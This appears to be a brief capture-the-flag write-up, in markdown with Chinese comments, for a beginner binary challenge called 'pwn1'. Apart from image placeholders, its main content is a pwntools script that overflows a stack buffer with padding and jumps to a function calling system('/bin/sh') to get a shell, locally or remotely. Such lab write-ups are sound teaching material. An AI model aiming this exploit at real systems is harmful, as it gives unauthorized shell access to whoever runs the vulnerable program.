![alt text](image.png)
![alt text](image-1.png)
![alt text](image-2.png)
![alt text](image-3.png)
![alt text](image-4.png)
![alt text](image-5.png)
![alt text](image-6.png)
![alt text](image-7.png)
![alt text](image-8.png)
![alt text](image-9.png)

```python
from pwn import *

io = process('.\pwn1')              # 本地测试
# io = remote()                     # 远程连接

getshell_code = 0x0040118A          # 包含system("/bin/sh");的函数的地址
# padding = 0xF + 4                   # 偏移量, 32位程序
# payload = b'a' * padding + p32(getshell_code)

padding = 0xF + 8                 # 偏移量, 64位程序
payload = b'a' * padding + p64(getshell_code)

io.sendline(payload)
io.interactive()

```

本地测试
![alt text](image-10.png)

远程连接
![alt text](image-11.png)

![alt text](image-12.png)